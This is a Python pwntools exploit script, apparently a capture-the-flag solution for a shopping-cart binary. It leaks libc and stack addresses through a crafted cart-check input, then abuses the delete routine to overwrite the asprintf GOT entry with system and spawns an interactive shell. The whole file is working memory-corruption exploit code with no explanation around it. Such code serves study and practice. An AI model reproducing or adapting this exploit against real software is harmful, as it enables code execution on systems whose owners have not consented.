from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample11')
elf = ELF('./data/sample11')
libc = elf.libc

def add(index,count):
    for i in range(count):
        p.recvuntil(b'>')
        p.sendline(b'2')
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())

def init():
    p.recvuntil(b'>')
    p.sendline(b'5')
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')

def leak(payload):
    p.sendline(b'4')
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)
    p.recvuntil(b'27: ')
    return u32(p.recv(4))

def delete(payload):
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)

def get_stack_addr(addr):
    for i in range(26):
        payload=b'y\x00' + p32(addr+8)+p32(0)+p32(0)+p32(0)
        addr = leak(payload)
    return addr

add(4,10);add(1,16);init()#step.1
payload=b'y\x00' + p32(elf.got['read'])+p32(0)+p32(0)+p32(0);data = leak(payload);libc_base = data - libc.symbols['read'];libc.address = libc_base;system_addr = libc.symbols['system'];bin_sh_addr = next(libc.search(b'/bin/sh'))#step.2
payload=b'y\x00' + p32(0x0804B070)+p32(0)+p32(0)+p32(0);heap_addr = leak(payload)#step.3
stack_addr = get_stack_addr(heap_addr)#step.4
payload=b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22);delete(payload)#step.5
payload=b'sh\x00\x00'+p32(system_addr);p.sendline(payload)#step.6
p.interactive()#step.7